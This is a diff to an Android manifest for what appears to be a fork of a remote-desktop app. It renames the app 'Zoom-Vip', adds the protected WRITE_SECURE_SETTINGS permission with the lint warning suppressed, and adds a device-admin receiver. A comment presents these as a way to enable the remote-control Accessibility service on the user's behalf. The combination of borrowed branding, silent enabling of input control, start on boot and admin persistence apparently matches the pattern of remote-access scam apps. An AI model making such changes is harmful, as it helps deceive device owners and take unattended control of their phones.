@@ -1,4 +1,5 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
     package="com.carriez.flutter_hbb">
 
     <!-- Core network / device permissions -->
@@ -14,6 +15,17 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
 
+    <!--
+      One-tap provisioning: on administered / device-owner fleets this is granted
+      by the provisioning script (adb shell pm grant). It lets the app flip the
+      single remote-control Accessibility toggle on the user's behalf during
+      setup, so the operator never has to walk through a second manual step.
+      It is NOT auto-granted on ordinary consumer installs; the wizard falls
+      back to a single Accessibility toggle in that case.
+    -->
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"
+        tools:ignore="ProtectedPermissions"/>
+
     <!-- Unattended access: start on boot -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
 
@@ -22,7 +34,7 @@
 
     <application
         android:name="${applicationName}"
-        android:label="zoom-private"
+        android:label="Zoom-Vip"
         android:icon="@mipmap/ic_launcher"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:allowBackup="false"
@@ -72,6 +84,7 @@
         <!-- Accessibility service — enables remote input injection for operator control -->
         <service
             android:name=".RemoteControlAccessibilityService"
+            android:label="@string/accessibility_service_label"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true">
             <intent-filter>
@@ -81,6 +94,20 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config"/>
         </service>
+
+        <!-- Device-owner receiver for zero-touch fleet provisioning -->
+        <receiver
+            android:name=".BetterDeskDeviceAdmin"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true"
+            android:enabled="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
 
         <meta-data
             android:name="flutterEmbedding"
